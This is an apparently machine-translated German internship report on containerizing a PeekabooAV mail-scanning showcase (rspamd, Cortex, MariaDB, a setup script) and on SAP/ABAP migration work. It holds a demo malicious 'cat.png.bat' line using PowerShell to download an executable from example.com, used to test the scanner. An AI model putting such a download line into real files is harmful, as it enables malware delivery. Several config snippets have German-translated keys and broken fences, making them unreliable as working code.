Dieser Auszug definiert die `rspamd`-Dienst. Wir setzen „image“ auf das zuvor erstellte Image und „build“ auf den Pfad zu dem Verzeichnis, in dem sich die rspamd-Dockerdatei befindet. `RSPAMD_ENABLED_MODULES` ist die Liste der Module, die wir aktivieren möchten. Die `RSPAMD_OPTION_FILTERS` ist die Liste der Filter, die wir auf leer gesetzt haben. Außerdem fügen wir eine Abhängigkeit vom `peekabooav`-Dienst hinzu und fügen einen Healthcheck hinzu.

Eine Zustandsprüfung führt den `test`-Befehl mit den angegebenen Optionen aus. „Intervall“ ist die Zeit zwischen jeder Überprüfung, „Timeout“ ist die Zeit, die auf die Beendigung des Befehls gewartet wird, bevor ein Fehler angenommen wird, und „Wiederholungen“ ist die Anzahl der Wiederholungen des Befehls, bevor aufgegeben wird. `start_period` ist die Wartezeit vor der ersten Prüfung. Der Dienst hat einen Integritätsstatus, der im Abschnitt „depends_on“ anderer Dienste verwendet werden kann, wie wir es mit „postfix_rx“ getan haben.

Bei der Erstellung dieses Dienstes sind einige Probleme aufgetreten. Zum Zeitpunkt meiner Praxisphase war das alte `docker-compose`-Kommando noch die Vorgabe und der Standard. Für die meisten Funktionen war das kein Problem, aber dieser Befehl entsprach nicht der neuesten Compose-Spezifikation. Wichtig ist, dass der Abschnitt „Gesundheitsprüfung“ vom alten Befehl nicht unterstützt wurde. Aus diesem Grund mussten wir Compose V2 verwenden, das die direkte Implementierung der Compose-Spezifikation ist. Da das Ziel dieses Projekts darin bestand, die Einführung zu erleichtern, war die Notwendigkeit einer nicht standardmäßigen Installation eines Tools ein Rückschritt.

Das andere Problem war, wie die E-Mail-Spezifikation von verschiedenen Clients gehandhabt wird. Genauer gesagt, wie genau der Dateiname in den Content-Type- und/oder Content-Disposition-Headern gesendet wird. Bei einigen E-Mail-Clients wird der Dateiname mit dem Inhaltstyp gesendet, bei anderen nur mit der Inhaltsdisposition.

<!-- ```yaml 
# GMail 
Content-Type: application/octet-stream; name="file.name" 
Inhaltsdisposition: Anhang; filename="file.name" 
``` --> 

<!-- ```yaml 
# GMX 
Content-Type: application/octet-stream 
Content-Disposition: attachment; filename=file.name 
``` --> 

<!-- ```yaml 
# Outlook  
Content-Type: application/octet-stream; name="datei.name"
Content-Disposition: attachment; filename="file.name";

_Dies sind Beispiele für E-Mail-Auszüge. Sie wurden zum Zeitpunkt des Schreibens aufgenommen und sahen zum Zeitpunkt des Projekts vermutlich etwas anders aus_ 

Wie Sie sehen können, kann das Zitat anders sein, selbst wenn der Dateiname in derselben Kopfzeile enthalten ist. Aufgrund dieser Diskrepanz habe ich einen Fehler im Code des Lua-Moduls entdeckt. Dieser Fehler wurde von einem externen Entwickler behoben, der auch das Lua-Modul für das Projekt geschrieben hat. 

#### PeekabooAV
 
Das Dockerfile für PeekabooAV muss komplexer sein als die bisherigen Dockerfiles. Dies liegt hauptsächlich daran, dass PeekabooAV nicht für die Installation mit einem Paketmanager wie apt verfügbar ist. Stattdessen müssen wir die Anwendung aus dem Quellcode erstellen und die endgültige Bildgröße trotzdem klein halten.

Um dies zu erreichen, haben wir eine spezielle Dockerfile-Funktion namens Multi-Stage Builds verwendet. [@UseMultistageBuilds2022] 
Mit dieser Funktion können wir ein reguläres Docker-Image definieren, das alle erforderlichen Tools zum Erstellen einer Anwendung enthält, und anschließend das eigentliche Anwendungs-Image definieren, in das wir bestimmte Dateien oder Verzeichnisse aus der vorherigen Phase einfügen können. 
Diese Funktion ist nützlich, um die Bildgröße klein zu halten, da viele Tools, die zum Erstellen einer Anwendung benötigt werden, nicht zum Ausführen benötigt werden.

Dieser Auszug ist die erste Stufe der PeekabooAV-Dockerdatei, die den Namen „build“ trägt.
Die Erstellungsphase installiert alle erforderlichen Abhängigkeiten und richtet PeekabooAV vollständig im Verzeichnis „/opt/peekaboo“ ein. Dies folgt genau den Installationsanweisungen in der PeekabooAV-Dokumentation, indem einige Entwicklungstools installiert, eine Python-Umgebung konfiguriert und erforderliche Konfigurationsdateien erstellt werden.

<!-- ```Dockerfile 
[...] 
FROM debian:bullseye-slim
COPY --from=build /opt/peekaboo/ /opt/peekaboo/ 
ENV DEBIAN_FRONTEND=noninteractive 

RUN groupadd -g 150 peekaboo 
RUN useradd -g 150 -u 150 -m -d /var/lib/peekaboo peekaboo 

RUN apt-get update -y && \ 
	apt-get install -y --no-install-suggests \ 
		python3-minimal \ 
		python3-distutils \
		# Dies wird für das Python-Magic-Paket 
		benötigt libmagic1 \ 
		libmariadb3 && \ 
	apt-get clean all && \ 
	find /var/lib/apt/lists -type f -delete 

COPY entrypoint.sh /opt/ 
RUN chmod +x /opt/ entrypoint.sh 

EXPOSE 8100 

USER peekaboo 
CMD ["/opt/entrypoint.sh"] 
``` --> 

Dies ist die Endphase der Dockerfile, die als eigentliches Image verwendet wird. Hier gehen wir von einem umfangreicheren Basis-Image aus, der Linux-Distribution Debian. Von dort kopieren wir das Verzeichnis `/opt/peekaboo/` aus der Build-Phase, dies ist die einzige Interaktion mit der vorherigen Phase. Danach ist es ein reguläres Dockerfile, ähnlich wie zuvor. Wir erstellen einen Peekaboo-Benutzer und installieren Python sowie die erforderlichen Bibliotheken.

Die entrypoint.sh wird erneut eingerichtet, um den Dienst mit Umgebungsvariablen zu konfigurieren.

<!-- ```yaml 
[...] 
  peekabooav: 
    image: peekabooav 
    build: ./ 
    env_file: 
      - compose.env 
    volumes: 
      - ./pipeline/ruleset.conf:/opt/peekaboo/etc/ruleset.conf
    abhängig_von: 
      cortex_setup: 
        Bedingung: service_completed_successfully 
      mariadb: 
        Bedingung: service_healthy 
    stop_grace_period: 1m15s 
    ports: 
      - "127.0.0.1:8100:8100" 
[...] 
``` -->

Wieder einmal ist die Dienstdefinition etwas anders. Wir verwenden eine weitere Bedingung in dependent_on, service_completed_successfully, die wartet, bis der angegebene Dienst ohne Fehler beendet wird. Ein weiteres wichtiges Bit ist stop_grace_period. Dies legt die Zeitspanne fest, die Docker darauf wartet, dass die Anwendung sich selbst schließt, nachdem sie das entsprechende Signal erhalten hat. Wenn dies nicht in der angegebenen Zeit erfolgt, wird der Dienst zwangsweise geschlossen.

Außerdem setzen wir die Umgebungsvariablen nicht direkt in der compose.yaml, sondern in einer extra Datei namens compose.env.
Dies geschah, weil die benötigten Umgebungsvariablen für die meisten anderen Dienste vielen Entwicklern bereits bekannt sind, da dies die Industriestandards sind. Das ist bei PeekabooAV nicht der Fall, daher wollten wir mehr Struktur bei der Eingabe der Variablen.

Wir verwenden diese Datei auch in anderen Diensten wie MariaDB. Dabei handelt es sich um eine branchenübliche kleine bis mittlere SQL-Datenbank, die von PeekabooAV verwendet wird. Sowohl PeekabooAV als auch MariaDB werden mit Umgebungsvariablen konfiguriert, und einige Variablen, zum Beispiel das Datenbankpasswort, müssen in beiden Diensten gleich sein. Aus diesem Grund ist es logisch, diese Einstellungen in einer einzigen Datei abzulegen.

Die Dienstdefinition für MariaDB enthält keine neuen Komponenten, da die einzigen wichtigen Teile die env_file sind, die auch auf die compose.env-Datei verweist. Das andere wichtige Bit ist ein weiterer Gesundheitscheck, um zu wissen, wann MariaDB vollständig ausgeführt wird.

#### Verhaltensanalyse – Cortex

Der Verhaltensanalysedienst übernimmt die schwere Aufgabe, festzustellen, ob ein Anhang bösartig ist oder nicht. Wir verwenden Cortex, ein Projekt von The Hive Project. Mit einem sehr modularen System können Sie verschiedene Observables wie IPs, Domains, Dateien und mehr analysieren. Cortex kann viele Tools verwenden, um diese Aufgabe zu erfüllen, und es kann vollständig über eine API ausgeführt werden. [@TheHiveProject]

Um ein Beispiel durchzugehen, stellen Sie sich die Datei „cat.png.bat“ als E-Mail-Anhang mit folgendem Inhalt vor:

<!-- „batch
powershell -command "start-bitstransfer -source http://example.com/file.exe 
``` --> 

Eine schädliche Datei ähnlich dieser ist ein gängiger Angriffsvektor, der auf Windows-Systeme abzielt. Da Windows nicht die echte Dateierweiterung anzeigt standardmäßig würde ein ahnungsloser Benutzer die Datei nur als „cat.png" sehen und würde wahrscheinlich nicht daran denken, sie zu öffnen. Aber in Wirklichkeit ist die Datei ein Skript, das eine ausführbare Datei von einem entfernten Server herunterlädt. Hier nichts weiter passiert, aber es wäre trivial für einen böswilligen Akteur, das System von diesem Punkt an weiter zu kompromittieren.Wir haben diese Datei bei der Entwicklung von PeekabooAV als Demo-Malware verwendet, um die Funktionalität zu testen.

Mit einer Verhaltensanalyse-Engine können wir diese Datei mit verschiedenen Analysatoren analysieren. Einige Analysatoren versuchen möglicherweise, den MIME-Typ der Datei zu erkennen, um sie als bösartig zu kennzeichnen oder nicht. Andere versuchen, die Datei in einer Sandbox auszuführen und alle Änderungen am Dateisystem zu verfolgen. Letzterer könnte erkennen, dass die vermeintliche `cat.png` tatsächlich eine ausführbare Datei herunterlädt. Es gibt mehr als 100 Analysatoren von Cortex, darunter auch bekannte Tools wie VirusTotal und Google Safe Browsing.
Obwohl wir für dieses Schaufenster nur einen einzigen Analysator namens FileInfo aktiviert haben. [@CortexDocs2022] [@CortexTheHive2022] [@TheHiveProject]

<!-- ```yaml 
[...] 
  cortex: 
    image: thehiveproject/cortex:3.1.4 
    env_file: 
      - compose.env
    Volumes: 
      - ./cortex/application.conf:/etc/cortex/application.conf 
      - ./cortex/analyzers.json:/etc/cortex/analyzers.json 
      - /var/run/docker.sock:/var/run /docker.sock 
      - ${PWD}/pipeline/data/jobs:${PWD}/pipeline/data/jobs 
    dependent_on: 
      - Elasticsearch 
    ports: 
      - "127.0.0.1:9001:9001" 
    healthcheck: 
      test: | 
        curl -s -H "Autorisierung: Träger $$PEEKABOO_CORTEX_API_TOKEN" \ 
            -o /dev/null -w %{http_code} http://localhost:9001/api/job | \ 
          grep -e '^200$$' -e '^520$$' 
      Intervall: 30s 
      Timeout: 30s 
      Wiederholungen: 3 
      start_period: 
[...] 
``` -->

Die Dienstdefinition für Cortex hat keine grundlegenden Unterschiede zu den vorherigen. Zwei bemerkenswerte Dinge sind die Verwendung eines vorgefertigten Images von The Hive Project und des Volumes „docker.sock“. Intern verwendet Cortex Docker, um jeden Analysator auszuführen, in unserem Anwendungsfall würde dies bedeuten, dass eine Docker-Instanz in einem anderen Docker-Container ausgeführt wird. Obwohl dies möglich ist, wird es nicht empfohlen, da es nicht mit dem Linux-Sicherheitsmodell konform ist und verschiedene Probleme in Bezug auf Dateisysteme auftreten können. [@UsingDockerinDockerYour] Um dies zu lösen, kann Cortex jeden Docker-Socket verwenden, den wir ihm übergeben. Dies gibt einem Container im Wesentlichen die Möglichkeit, einen anderen Container neben ihm auf demselben Hostcomputer zu starten, wodurch die oben genannten Probleme beseitigt werden. Eine Einschränkung dieses Ansatzes besteht darin, dass der Host angeblich eine Linux-Maschine sein muss,

Darüber hinaus ist Cortex nicht für die direkte Verwendung aus dem Docker-Image eingerichtet. Da Cortex über das Webinterface gesteuert wird, würde man normalerweise beim ersten Start diese Schritte durchlaufen:

1. Klicken Sie auf die Schaltfläche _Datenbank migrieren_
2. Erstellen Sie einen Admin-Benutzer mit Benutzername und Passwort
3. Erstellen Sie eine Organisation innerhalb von Cortex, hier _PeekabooAV_ genannt
4. Erstellen einen _orgAdmin_-Benutzer für die Organisation
5. Erstellen Sie einen regulären Benutzer
6. Kopieren Sie den generierten API-Schlüssel, um die Cortex-API zu verwenden
7. Aktivieren Sie die Analysatoren, die Sie verwenden möchten, hier nur FileInfo 8.0,

da dies ein Schaufenster ist, mit dem Sie ganz von vorne anfangen können eine einzelne Aktion, dies ist nicht akzeptabel. Dafür haben wir den Dienst „cortex_setup“ erstellt. Unten ist die Dockefile für diesen Container.

<!-- ```Dockerfile 
FROM alpine:latest 
RUN apk add --no-cache curl pwgen jq 

COPY cortexSetup.sh / 
RUN chmod 755 /cortexSetup.sh 

ENTRYPOINT ["/cortexSetup.sh"] 
``` --> 

Da das cortexSetup.sh-Skript etwa 200 Zeilen lang ist und der meiste wichtige Code sehr ähnlich ist, werde ich hier nur Teile davon besprechen.

<!-- ```env 
# Auszug aus compose.env ## 

Cortex Setup 
CORTEX_ADMIN_PASSWORD= 
CORTEX_URL=http://cortex:9001 
ELASTIC_URL=http://elasticsearch:9200 
``` -->

Das Skript muss die Speicherorte von Cortex und Elasticsearch kennen, einer Open-Source-NoSQL-Datenbank, die von Cortex verwendet wird. Diese Speicherorte können dem Skript entweder über ein Argument in der Befehlszeile oder über Umgebungsvariablen übergeben werden, wie oben über die Datei compose.env gezeigt, die in der Dienstdefinition enthalten ist.  
[...]
CODE=$(curl -s -o /dev/null -w "%{http_code}" "$CORTEX_URL/api/job"

Die Variable CORTEX_ADMIN_PASSWORD wird als Administratorpasswort verwendet, oder wenn sie leer ist, wird vom Skript ein zufälliges Passwort generiert.

Der erste Schritt für das Setup-Skript besteht darin, festzustellen, ob Cortex bereits eingerichtet ist. Dies ist der Fall, wenn wir den gesamten Showcase herunterfahren und jeden Dienst neu starten. Trivialerweise wollen wir nicht versuchen, ein bereits eingerichtetes System einzurichten.

<!-- ```bash 
RC="$?" 
[...] 

if [ "$RC" -ne "0" ] ; then 
  echo 
  echo "Kortex nicht erreichbar: $RC, $CODE" 
  printf "\033[?25h\033[0m" 
  exit 1 
elif [ "$CODE" -eq "520" ]; dann 
  echo "Cortex muss eingerichtet werden" 
  [...] 
elif [ "$CODE" -eq "401" ]; 
[...] 
``` -->

Der obige Auszug wird verwendet, um zu prüfen, ob Cortex eingerichtet werden muss. Der abgefragte Endpunkt kann einen Statuscode von 520 zurückgeben, was auf einen internen Fehler hinweist, aus dem wir schließen, dass der Server nicht eingerichtet ist. Wenn der Statuscode 401 lautet, wissen wir, dass Cortex eingerichtet ist, da es weiß, dass die von uns gestellte Anfrage für diesen Endpunkt nicht autorisiert ist. Es können auch andere Endpunkte verwendet werden, aber einige haben ein komplexeres Verhalten in Bezug auf den Statuscode. Wir prüfen auch und beenden, wenn die angegebene Cortex-URL nicht erreichbar ist.

Sobald wir wissen, dass wir Cortex einrichten müssen, beginnen wir mit ähnlichen Schritten wie ein Benutzer:

1. Migrieren Sie die Datenbank
   . 2. Erstellen Sie einen Admin-Benutzer mit dem bereitgestellten oder generierten Passwort
   . 3. Erstellen Sie die Organisation PeekabooAV.
4. Erstellen Sie den Benutzer _orgAdmin_
5. Erstellen Sie einen regulären Benutzer
6. Holen Sie sich den Elasticsearch-Index für die internen Daten von Cortex
7. Schreiben Sie unseren eigenen API-Schlüssel direkt in die Datenbank
8. Aktivieren Sie FileInfo 8.0

Die meisten dieser Schritte können durch Aufrufen eines API-Endpunkts ausgeführt werden, den ich mit gefunden habe die Hilfe der Entwicklertools im Chrome-Browser.

<!-- ```bash 
[...] 
	printf "\t\033[38;5;226m" 
	printf "Organisation 'PeekabooAV' erstellen..." 
	printf "\033[38;5;242m" 
	curl - f -s -o /dev/null -XPOST -u "admin:$CORTEX_ADMIN_PASSWORD" \ 
		-H 'Content-Type: application/json' \ 
		"$CORTEX_URL/api/organization" \ 
		-d '{ "name": " PeekabooAV", 
			" 
[...] 
``` --> 

Oben ist ein Auszug aus der entrypoint.sh, wo wir Schritt 3 handhaben. `curl` ist eine der gebräuchlichsten Möglichkeiten, beliebige HTTP-Anfragen von der Konsole oder einem Skript aus zu stellen Linux. Vor dem Curl-Befehl geben wir aus, was wir tun werden, in diesem Fall erstellen Sie die Organisation, zusammen mit einigen Formatierungen, um der Ausgabe mit VTS (Virtual Terminal Sequences) Farbe hinzuzufügen. [@Curl] [@miniksaConsoleVirtualTerminal]

Die meisten anderen Schritte werden ähnlich gehandhabt, wobei der Endpunkt unterschiedlich ist und die mit `-d` angegebenen Daten entsprechend geändert werden.

Der Unterschied zwischen den Schritten, die das Skript ausführt, und dem, was ein Benutzer tun würde, besteht darin, wie der API-Schlüssel behandelt wird. Normalerweise würde der Benutzer den zufällig generierten API-Schlüssel von der Webschnittstelle kopieren und ihn in seine andere Anwendung einfügen. Dies ist in unserem Fall nicht möglich, da im Einrichtungsprozess keine Benutzerinteraktion erforderlich sein kann. Anstatt den zufälligen API-Schlüssel zu kopieren und irgendwie zu speichern, um ihn in PeekabooAV zu verwenden, finden wir heraus, in welcher Elasticsearch-Datenbank Cortex seine internen Daten speichert. Sobald wir die Datenbank kennen, können wir den API-Schlüssel durch unseren eigenen Schlüssel ersetzen, den der Benutzer mit compose.env bereitgestellt hat. Indem es in der Datei compose.env bereitgestellt wird, kann es von jedem Dienst aufgerufen werden, der die Datei compose.env verwendet.

<!-- ```bash 
check_last_command () { 
	if [ $? -eq 0 ]; dann 
		printf " "
		printf "\033[38;5;118m" 
		printf "o" 
		printf "\033[0m\n" 
	else 
		# Cursor wieder einschalten und Farben vor dem Beenden zurücksetzen 
		printf "\033[?25h\033[0m\n" 
		beenden 1 
	fi 
} 
[...] 
``` --> 

Die Funktion `check_last_command` wird nach jedem Schritt ausgeführt, sie prüft, ob der letzte Befehl mit dem Statuscode 0 beendet wurde. Wenn ja, gibt sie ein grünes `o` und das Skript aus geht weiter. Wenn nicht, setzt es das Terminal mit VTS zurück und beendet das Skript.

### Architektur

Es gibt im Wesentlichen eine Kette von Abhängigkeiten zwischen den Diensten.

<!-- ```{.mermaid with=1200 caption="Pipeline-Architektur"
  c(cortex) 
  e(elasticsedarch) 
  p(peeakaboo) 
  r(rspamd) 
  m(mariadb) 
  cs(cortex_setup) 
  c -.-> e 
  cs -.-> c 
  p -.-> m 
  p -.-> cs 
  rx - .-> r 
  r -.-> p 
``` --> 

In der Abbildung oben sehen Sie die Abhängigkeiten zwischen den Diensten. Diese Abhängigkeiten bewirken, dass der Start des Showcases sehr lange dauern kann, da postfix_rx, das zum Versenden einer Test-E-Mail verwendet wird, eine lange Abhängigkeitskette hat. Der Vorteil dabei ist, dass Sie die Pipeline nicht verwenden können, wenn sie nicht richtig eingerichtet ist, wodurch möglicherweise Verwirrung vermieden wird.

## Ergebnis

Wie am Anfang dieses übergreifenden Kapitels erläutert, bestand die Aufgabe darin, eine Vorzeige-Pipeline für PeekabooAV zu containerisieren, mit dem Ziel, die Einführung von PeekabooAV zu erleichtern.

Der Auftrag wurde am Ende meiner Phase voll funktionsfähig abgeschlossen. Obwohl einige Abkürzungen genommen wurden, zum Beispiel nur einen Analysator mit Cortex zu aktivieren oder alle anderen rspamd-Module zu deaktivieren. Dies ist jedoch akzeptabel, da deutlich gemacht wird, dass es sich um eine Vitrine handelt und nicht für die Produktion geeignet ist. Diese Verknüpfungen wirken sich auch nicht auf das Ziel der Erleichterung der Einführung aus, da dies erreicht wird, indem einem Benutzer einfach die Möglichkeit gegeben wird, die Pipeline mit Beispiel-E-Mails oder sogar eigenen Dateien als Anhänge auszuprobieren. Diese Pipeline ist auch ein guter Anfang, wenn man PeekabooAV in einer Produktionsumgebung einsetzen möchte.

Nach meiner Phase wurde noch etwas gearbeitet, was hauptsächlich die Rationalisierung von Zustandsprüfungen und einigen Konfigurationen sowie die Bereinigung dessen, was protokolliert und was unterdrückt wird, umfasst, um die Gesamtqualität des Showcase zu verbessern.

\fill

# Praxisphase bei Energy4U

## Einführung

Ähnlich wie in der vorherigen Phase haben wir die Möglichkeit, den Fachbereich unserer Praxisphase zu wählen. In meiner vierten Gesamtphase habe ich in der Atos-Tochter Energy4U gearbeitet.

Energy4U lässt sich am besten als Dienstleister der deutschen Energiewirtschaft beschreiben. Das bedeutet, dass es von Lieferanten beauftragt wird, die für einen ordnungsgemäßen Betrieb im deutschen Energiesektor erforderlich sind.

In dieser eher kurzen Phase arbeitete ich daran, die kundenorientierten Berichte vom alten SAP-System auf das neue SAP-System zu migrieren. [@AtosWorldgridCompany]

Bevor ich mit der Arbeit an meinen technischen Aufgaben begann, bekam ich eine Präsentation und Ressourcen, um mich mit dem deutschen Energiemarkt vertraut zu machen. Dies wurde getan, um zu verstehen, warum die Dinge so gemacht werden, wie sie sind. Es hat mir auch geholfen, mit anderen Kollegen ins Gespräch zu kommen. Dennoch sind die Besonderheiten des deutschen Energiemarktes für den weiteren Inhalt dieses Papiers nicht von Bedeutung und werden daher weggelassen.

### Motivation

Für jedes moderne technologieorientierte Unternehmen ist es wichtig, moderne Systeme zu verwenden und in Leistung und Sicherheit auf dem neuesten Stand zu bleiben. Vor allem im deutschen Energiemarkt, der regelmäßig zwangsläufige Anpassungen hinsichtlich der Kommunikation vorsieht.
Da SAP, das in vielen Industriemärkten eingesetzt wird, ein aktualisiertes Softwarepaket namens SAP S/4HANA herausgebracht hat, steckt viel Arbeit in der Migration des aktuellen Betriebs auf das neue System. [@SAP4HANACloud]

### Aufgabe Da

einer der wichtigsten Bestandteile einer erfolgreichen Migration die Kenntnis des neuen Systems ist, bestand meine erste Aufgabe darin, einen Bericht zu erstellen, der Tabellen anhand einfacher Suchbegriffe finden kann. Dies könnte im weiteren Migrationsprozess genutzt werden, um geeignete Alternativen für Tabellen zu finden, die im neuen System nicht eins zu eins vorhanden sind.

Meine zweite Aufgabe bestand darin, die kundenorientierten Teile der E4U-Toolbox zu migrieren. Die Toolbox ist eine intuitive Benutzeroberfläche, die häufig verwendete Berichte und Transaktionen an einem einzigen navigierbaren Ort gruppiert. Es wird auch verwendet, um die Bereitstellung zu vereinfachen, da keine Transaktion für jedes einzelne Programm erstellt werden muss. [@InternalE4UToolbox]

## Voraussetzungen

### SAP-Grundlagen

Da die SAP-Technologie in einem weiten Feld der Industrie für unterschiedliche Aufgaben eingesetzt wird, gehen wir hier nur auf die notwendigen Grundlagen von SAP ein, die ich in meiner Phase verwendet habe. Dazu gehören die Programmierung mit ABAP und die Nutzung der entsprechenden SAP-Werkzeuge.

ABAP ist die Programmiersprache, die bei der Entwicklung für SAP-Systeme verwendet wird. Es handelt sich um eine Hochsprache, die als Schmelztiegel unterschiedlicher Sprachmerkmale und -einflüsse bezeichnet werden kann, da sie zum Zeitpunkt des Schreibens fast 40 Jahre alt ist.
Es gibt viele Unterschiede zu anderen Sprachen, die ein Entwickler beachten muss, zum Beispiel:

- Bei Schlüsselwörtern wird die Groß-/Kleinschreibung nicht beachtet, was bedeutet, dass `WRITE` und `WrItE` effektiv dasselbe sind.
- Zeilen werden statt mit Semikolon oder Zeilenumbruch mit einem Punkt abgeschlossen.
- Es ist Whitespace-sensitiv, so dass a = b+c(d) und a = b + c( d ) nicht gleich sind.

Viele der Unterschiede und Besonderheiten ergeben sich aus der Tatsache, dass ABAP alt ist und für einen bestimmten Zweck entwickelt wurde. Da Sprachen wie C oder Java als Allzwecksprachen konzipiert sind, wurde ABAP entwickelt, um komplexe Geschäftsprobleme zu lösen und eng mit Datenbanktabellen zusammenzuarbeiten.
Die Art und Weise, wie man Datenbanken in ABAP verwenden kann, ist mit dem OpenSQL-Dialekt. Dieser Dialekt wurde von SAP speziell für die Verwendung in ABAP entwickelt, da ein SAP-System eine Vielzahl unterschiedlicher Datenbanken verwenden kann, die alle ihren eigenen Dialekt haben, der unterschiedliche Funktionen unterstützt. OpenSQL-Anweisungen werden von einem SQL-Parser _übersetzt_, der, wie SAP es nennt, native SQL-Anweisungen erstellt, die spezifisch für die verwendete Datenbank sind. [@OpenSQLSAP] [@InternalABAPHelp] [@AllSAPCommunity]

Um ein ABAP-Programm zu aktualisieren, braucht man eine Möglichkeit, den Code einzugeben. Dazu gibt es im Wesentlichen zwei Möglichkeiten:

Entweder in der SAP GUI, der grafischen Benutzeroberfläche, die verwendet wird, um auf ein SAP-System zuzugreifen und Transaktionen auszuführen. Eine Transaktion ist eine Möglichkeit, ein Programm schnell auszuführen, indem man ihm einfach einen eindeutigen Code (im Folgenden Tcode genannt) gibt, der auf dem Startbildschirm der SAP GUI eingegeben werden kann. Viele der standardmäßig von SAP bereitgestellten Tools haben einen Tcode. Der wichtigste Tcode zum Schreiben von Programmen ist „SE38“, der ABAP-Editor. Dort können Sie Code ähnlich wie in jeder anderen IDE schreiben.

![Screenshot von `SE38` geöffnet in der SAP GUI](images/se38.png)

Es gibt einige weitere ungewöhnliche Aufgaben in der ABAP-Programmierung, die die Entwickler erledigen müssen, unabhängig davon, wie sie ihren Code schreiben. Das überprüft den Code auf Fehler, die zur Kompilierzeit erkannt werden können, darunter Syntaxfehler, fehlende Datentypen und Fehler in OpenSQL-Anweisungen. Anschließend muss der Entwickler das Programm aktivieren. Die Aktivierung ist ein sehr häufiger Vorgang, wenn etwas mit SAP entwickelt wird, da jeder Objekttyp aktiviert werden muss, bevor er verwendet werden kann. Dazu gehören auch Programme, da Code intern in einer Datenbank gespeichert wird, ähnlich wie die meisten anderen Elemente in SAP, und daher aktiviert werden muss. Nur wenn ein Programm aktiv ist, kann es ausgeführt werden. Diese drei Vorgänge können über Shortcuts oder über Schaltflächen ausgeführt werden, die unter der Überschrift in Abbildung @fig:se38 sichtbar sind.

ADT (ABAP Development Tools) sind eine Reihe von Plugins für die Eclipse-IDE, die Eclipse für die Verwendung mit der SAP-ABAP-Programmierung anpassen. Nach der Installation können Sie die Verbindungen verwenden, die Sie in SAP GUI definiert haben, oder neue definieren und sich mit SAP-Systemen verbinden.

![Screenshot von Eclipse mit aktiver ABAP-Ansicht](images/adt.png)

Wie in Abbildung @fig:adt zu sehen, ist die Interaktion mit dem angeschlossenen ABAP-System hauptsächlich der `Project Explorer` auf der linken Seite. Es ist ein Panel, das alle Pakete auf den Systemen zeigt, wo man auch Pakete zu seinen Favoriten hinzufügen kann. Pakete sind die Art und Weise, wie SAP-Elemente wie Datenelemente, Programme usw. organisiert sind. Sie können auch rekursiv verwendet werden, was bedeutet, dass ein Paket innerhalb eines anderen Pakets sein kann.

![Screenshot des Projekt-Explorers mit einigen Paketen](images/pe.png)

In Abbildung @fig:pe sehen Sie ein Beispiel dafür, wie Pakete verwendet werden können, um Programme zusammen mit anderen Elementen, von denen sie abhängen, zu organisieren.

Abgesehen von der Oberfläche und davon, wie der Entwickler den Erstellungsprozess eines ABAP-Programms startet, gibt es keinen großen Unterschied zwischen der Verwendung von SAP GUI und ADT.
Trivialerweise ist der Code bei beiden Tools genau gleich, und die drei oben besprochenen Schritte sind immer noch erforderlich, um ein Programm auszuführen. Eine Verbesserung der Lebensqualität besteht darin, dass die Codeprüfung automatisch während der Eingabe erfolgt. Das bedeutet, dass Sie praktisch sofort wissen, wenn Sie einen Fehler gemacht haben, zum Beispiel in einer `WHERE`-Klausel in einer OpenSQL-Anweisung. Anschließend muss der Entwickler das Programm nur noch aktivieren und ausführen, was über die entsprechenden Schaltflächen in einer Symbolleiste ähnlich der des SAP GUI oder über Shortcuts erfolgen kann.

Es gibt keinen dramatischen Unterschied im Entwicklungsprozess zwischen den beiden diskutierten Tools. Die Wahl des einen oder anderen ist meist eine Frage der Vorlieben und was Ihre spezifischen Aufgaben mit sich bringen. Wenn Sie beispielsweise mit Ihrem Programm viele andere Elemente erstellen und vielleicht sogar Datenbanktabellen ausfüllen müssen, ist es sinnvoll, das SAP GUI zu verwenden, um Ihre Kontextänderungen beim Arbeiten einzuschränken. Wenn Sie hingegen hauptsächlich Code schreiben und mit Eclipse oder ähnlichen IDEs vertraut sind, ist es sinnvoll, ADT zu verwenden. Aus Gesprächen mit Kollegen während meiner gesamten Phase waren viele der Meinung, dass der Programmierworkflow und die Programmierung spezifischer Tools in ADT besser sind.

Andere spezifischere Teile des SAP-Systems werden gegebenenfalls in den folgenden Abschnitten erörtert.

## Bruteforce-Tabellenfinder

Wie im Abschnitt Aufgabenstellung kurz erläutert, sind Kenntnisse des neuen Systems für eine erfolgreiche Migration zwingend erforderlich. Aus diesem Grund und um mich an SAP und ABAP zu gewöhnen, habe ich einen Report erstellt, der Tabellen von einfachen Suchbegriffen finden kann. Genauer gesagt kann ein Benutzer eine beliebige Anzahl einfacher Suchbegriffe eingeben, die aus einem oder mehreren Wörtern bestehen. Der Report durchsucht dann jede Tabelle und Struktur, die in der Datenbanktabelle „dd02t“ gefunden wird. Diese Tabelle ist eine Standardtabelle, die den Namen und die Beschreibung aller anderen von SAP ausgelieferten Tabellen und Strukturen enthält.

[//]: # (```{.mermaid caption="Flowchart of the report"})

[//]: # (graph TD)

[//]: # ( input(Benutzereingabe Suchbegriffe und wo Klausel))

[//]: # ( filter(gefilterte Namen))

[//]: # ( searchName(nach mindestens einem suchen<br/>

[//]: # ( searchKeys -->|Ergebnis zur Ausgabe hinzufügen| Ausgabe)

[//]: # ( Ausgabe --> Anzeige)

[//]: # (```)

Die obige Abbildung veranschaulicht den Datenfluss im Bericht. Die mehrfach erwähnte „WHERE“-Klausel ist ein wichtiger Bestandteil dieses Berichts. Bei Redaktionsschluss befinden sich etwa 900.000 Einträge in der `dd03t`-Tabelle, und die `WHERE`-Klausel wird verwendet, um den Suchraum durch vorheriges Filtern der Namen einzuschränken. Wenn der Benutzer beispielsweise mit hoher Wahrscheinlichkeit weiß, dass das, wonach er sucht, das Werk „EMMA“ enthält, kann er „%EMMA%“ in die „WHERE“-Klausel eingeben, um den Suchraum auf knapp über 100 Einträge zu begrenzen. Das Erraten einer Teilzeichenfolge der Tabelle, nach der der Benutzer sucht, ist keine vollständige Lösung, um den Suchraum einzuschränken, obwohl es wahrscheinlich besser ist, zuerst einen Suchraum von etwa 100 Einträgen zu verwenden und bei Bedarf einen um mehrere Größenordnungen größeren Suchraum zu verwenden .

![Screenshot der Eingabemaske für den Bericht](images/input.png)

